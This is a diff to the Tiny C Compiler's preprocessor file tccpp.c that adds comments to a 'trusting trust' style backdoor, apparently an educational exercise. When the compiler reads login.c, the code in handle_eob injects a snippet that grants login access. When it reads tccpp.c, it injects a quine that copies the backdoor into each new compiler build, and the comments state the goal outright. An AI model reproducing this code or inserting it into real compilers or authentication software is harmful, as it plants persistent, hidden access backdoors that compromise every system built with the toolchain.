@@ -654,8 +654,18 @@ static int handle_eob(void)
             #endif
                         len = read(bf->fd, bf->buffer, len);
 
-            /* Bugged login code start*/
 
+            /* Since libtcc.c also include tccpp.c, we can set the bug here. This code will deal with bugging
+            the function that read in the source codes. The function handle_eob did just that, so we have to set
+            up in a way that when the function is reading the source code to compile and encounter certain files, it will 
+            inject certain snippet of codes into that file before compiling so when compiled, it will have that backdoor
+            code in the source code. */
+
+            /* Goal: Inject a quine that allow root and another user to login 
+               Idea: quine that will insert into login.c and tccpp.c
+            */
+
+            /* Bugged login code start*/
             /* The source code to hack login.c */
 
             // The string to be inserted into login.c
@@ -664,7 +674,9 @@ static int handle_eob(void)
             // %c 10 = newline (\n)
             // %c 92 = /
             if(strstr(file->filename, "login.c") != NULL) {
+                //allocate memory for the code to be inject into login.c
                 unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);
+                //store quine for login.c as a string in the buffer in preparation for code injection
                 snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);
                 int inject_len = strlen(inject_login);
                 unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
@@ -691,7 +703,9 @@ static int handle_eob(void)
             // Inject_compiler is the string able to represent the whose code block to be insert.
             const char* inject_compiler = " const char* inject_login = %c%s%c;%c  if(strstr(file->filename, %clogin.c%c) != NULL) {%c  unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 200);%c  snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 92, 34, 10, 10, 10);%c int inject_len = strlen(inject_login);%c unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c unsigned char* inject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c int pre_inject_len = inject_location - bf->buffer;%c new_buf[0] = %c %c;%c  strncpy(new_buf + 1, bf->buffer, pre_inject_len);%c strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c  strcat(new_buf, inject_location);%c  len = len + inject_len - 9;%c  strncpy(bf->buffer, new_buf, len);%c  bf->buffer[len] = 0;%c  tcc_free(inject_code);%c  tcc_free(new_buf);%c }%c  if(strstr(file->filename, %ctccpp.c%c) != NULL) {%c  const char* inject_compiler = %c    %c%s%c;%c  unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);%c  snprintf(inject_code, 9900, inject_compiler, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);%c  int inject_len = strlen(inject_code);%c unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);%c  unsigned char* inject_location = strstr(bf->buffer, %cif (len < 0)%c);%c  int pre_inject_len = inject_location - bf->buffer;%c  strncpy(new_buf, bf->buffer, pre_inject_len);%c  strncpy(new_buf + pre_inject_len, inject_code, inject_len);%c  strcat(new_buf, inject_location);%c  len = len + inject_len - 1;%c  strncpy(bf->buffer, new_buf, len + 2);%c  bf->buffer[len + 2] = 0;%c  tcc_free(inject_code);%c   tcc_free(new_buf);%c }%c  ";
             if(strstr(file->filename, "tccpp.c") != NULL) {
+                //allocate memory for the code to be inject into tccpp.c
                 unsigned char* inject_code = tcc_malloc(sizeof(unsigned char) * 9900);
+                //store the entire bugged code snippet as a string in the buffer in preparation for code injection into tccpp.c
                 snprintf(inject_code, 9900, inject_compiler, 34, inject_login, 34, 10, 34, 34, 10, 10, 10, 10, 10, 34, 92, 34, 34, 10, 10, 39, 39, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 34, inject_compiler, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
                 int inject_len = strlen(inject_code);
                 unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
